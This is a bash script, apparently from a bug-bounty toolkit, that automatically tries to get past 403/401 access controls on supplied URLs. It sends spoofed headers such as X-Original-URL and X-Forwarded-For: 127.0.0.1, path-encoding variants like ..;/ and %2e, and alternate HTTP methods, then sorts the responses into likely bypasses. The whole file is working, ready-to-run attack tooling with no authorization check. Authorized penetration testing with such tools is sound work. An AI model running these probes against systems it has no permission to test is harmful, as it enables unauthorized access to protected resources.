#!/bin/bash
# =============================================================================
# 403/401 Bypass Probe — try common header/method/encoding tricks against a URL
#
# Wraps byp4xx (lobuhi) when present. Falls back to a built-in matrix of the
# most-paid bypass techniques from disclosed reports so it works out of the box.
#
# Usage:
#   ./tools/bypass_403.sh <url>
#   ./tools/bypass_403.sh -l <urls-file>     # one URL per line, parallelised
# =============================================================================

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
. "$SCRIPT_DIR/external_arsenal.sh"

GREEN='\033[0;32m'; RED='\033[0;31m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; MAG='\033[0;35m'; NC='\033[0m'
log()  { echo -e "${CYAN}[*]${NC} $1"; }
ok()   { echo -e "${GREEN}[+]${NC} $1"; }
hit()  { echo -e "${MAG}[BYPASS]${NC} $1"; }
err()  { echo -e "${RED}[-]${NC} $1" >&2; }

URL=""; LIST=""
while [ "$#" -gt 0 ]; do
  case "$1" in
    -l|--list) shift; LIST="${1:-}" ;;
    -h|--help) sed -n '2,10p' "$0"; exit 0 ;;
    *) URL="$1" ;;
  esac
  shift
done

[ -z "$URL" ] && [ -z "$LIST" ] && { err "url or -l <file> required"; exit 2; }

OUT_DIR="${BYPASS_OUT_DIR:-$(pwd)/findings/bypass/$(date +%Y%m%d_%H%M%S)}"
mkdir -p "$OUT_DIR"

# shellcheck source=banner.sh
. "$SCRIPT_DIR/banner.sh"
print_banner "403 / 401 Bypass Probe" "${URL:-$LIST}" \
    "byp4xx|full bypass matrix when installed" \
    "Built-in|header · method · path · encoding tricks" \
    "Report|matched response codes per technique"

if _have byp4xx; then
  log "byp4xx bypass matrix..."
  if [ -n "$URL" ]; then
    byp4xx -u "$URL" 2>/dev/null > "$OUT_DIR/byp4xx.txt" || true
  else
    byp4xx -L "$LIST" 2>/dev/null > "$OUT_DIR/byp4xx.txt" || true
  fi
  ok "byp4xx done — see $OUT_DIR/byp4xx.txt"
  exit 0
fi

# WAF challenge page patterns — if body matches, downgrade to [INFORMATIONAL]
_is_waf_page() {
  echo "$1" | grep -qiE "Access Denied|Cloudflare|You have been blocked|blocked by|security check|Please Wait|Ray ID|cf-error"
}

_normalize_body() {
  local body_file="$1"
  python3 - "$body_file" <<'PY'
import re
import sys
from pathlib import Path

text = Path(sys.argv[1]).read_text(encoding="utf-8", errors="ignore")

# Remove obvious volatile material before comparison.
replacements = [
    (r'(?i)\b[0-9a-f]{32,64}\b', '<hash>'),
    (r'(?i)\b[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}\b', '<uuid>'),
    (r'\b\d{4,}\b', '<num>'),
    (r'(?i)(csrf|xsrf|token|nonce|session|request[_-]?id|trace[_-]?id|ray id|cf-ray)[^<>\n\r]*', r'\1:<redacted>'),
]

for pattern, repl in replacements:
    text = re.sub(pattern, repl, text)

text = re.sub(r'\s+', ' ', text).strip()
print(text)
PY
}

# Built-in fallback — most common header / method / path tricks
_probe_one() {
  local target="$1" found=0
  local base="${target%/*}"      # strip last segment
  local last="${target##*/}"
  log "probing $target"

  # Capture baseline 403 body length for content comparison
  local orig_body orig_len orig_norm orig_code
  orig_body=$(curl -sk --max-time 5 "$target" 2>/dev/null || true)
  orig_len=${#orig_body}
  orig_norm=$(printf '%s' "$orig_body" | _normalize_body /dev/stdin 2>/dev/null || printf '%s' "$orig_body")
  orig_code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$target" 2>/dev/null || echo 0)

  for combo in \
    "GET|$target|X-Original-URL: $target" \
    "GET|$target|X-Rewrite-URL: $target" \
    "GET|$target|X-Forwarded-For: 127.0.0.1" \
    "GET|$target|X-Forwarded-Host: localhost" \
    "GET|$target|X-Custom-IP-Authorization: 127.0.0.1" \
    "GET|$target|X-Client-IP: 127.0.0.1" \
    "GET|$target|X-Host: localhost" \
    "GET|${base}/%2e/${last}|" \
    "GET|${base}/.${last}|" \
    "GET|${base}/${last}/|" \
    "GET|${base}/${last}/.|" \
    "GET|${base}/${last};/|" \
    "GET|${base}/${last}..;/|" \
    "GET|${base}/${last}.json|" \
    "GET|${base}/${last}#|" \
    "POST|$target|" \
    "PUT|$target|" \
    "PATCH|$target|" \
    "TRACE|$target|" ; do
    method=$(echo "$combo" | cut -d'|' -f1)
    url=$(echo "$combo" | cut -d'|' -f2)
    hdr=$(echo "$combo" | cut -d'|' -f3)

    # Capture body and status code together
    local body_file
    body_file=$(mktemp /tmp/bypass_body_XXXXXX)
    args=( -sk -w "%{http_code}" --max-time 5 -X "$method" -o "$body_file" )
    [ -n "$hdr" ] && args+=( -H "$hdr" )
    code=$(curl "${args[@]}" "$url" 2>/dev/null || echo 0)
    bypass_body=$(cat "$body_file" 2>/dev/null || true)
    bypass_norm=$(printf '%s' "$bypass_body" | _normalize_body /dev/stdin 2>/dev/null || printf '%s' "$bypass_body")
    rm -f "$body_file"
    bypass_len=${#bypass_body}

    if [ "$code" = "200" ] || [ "$code" = "201" ] || [ "$code" = "204" ]; then
      # Determine confidence state:
      #   [CONFIRMED]    — normalized body differs from baseline and no WAF page pattern matches
      #   [POSSIBLE]     — 200 returned but normalized body is still effectively the same
      #   [INFORMATIONAL]— body contains WAF challenge strings or only redirects
      local len_diff=$(( bypass_len - orig_len ))
      [ "$len_diff" -lt 0 ] && len_diff=$(( orig_len - bypass_len ))

      local state
      if _is_waf_page "$bypass_body"; then
        state="[INFORMATIONAL]"
      elif [ "$bypass_norm" = "$orig_norm" ]; then
        state="[POSSIBLE]"
      else
        state="[CONFIRMED]"
      fi

      hit "$state $method  $url  $hdr  → HTTP $code (body_len=$bypass_len orig_len=$orig_len baseline_code=$orig_code)"
      echo "$state $method|$url|$hdr|$code|body_len=$bypass_len|orig_len=$orig_len|baseline_code=$orig_code" >> "$OUT_DIR/bypass_hits.txt"
      found=1
    elif [ "$code" = "301" ] || [ "$code" = "302" ] || [ "$code" = "303" ] || [ "$code" = "307" ] || [ "$code" = "308" ]; then
      hit "[INFORMATIONAL] $method  $url  $hdr  → HTTP $code (redirect)"
      echo "[INFORMATIONAL] $method|$url|$hdr|$code|redirect" >> "$OUT_DIR/bypass_hits.txt"
      found=1
    fi
  done
  [ "$found" = "0" ] && ok "no bypass on $target"
}

if [ -n "$URL" ]; then
  _probe_one "$URL"
else
  while IFS= read -r u; do
    [ -z "$u" ] && continue
    _probe_one "$u"
  done < "$LIST"
fi
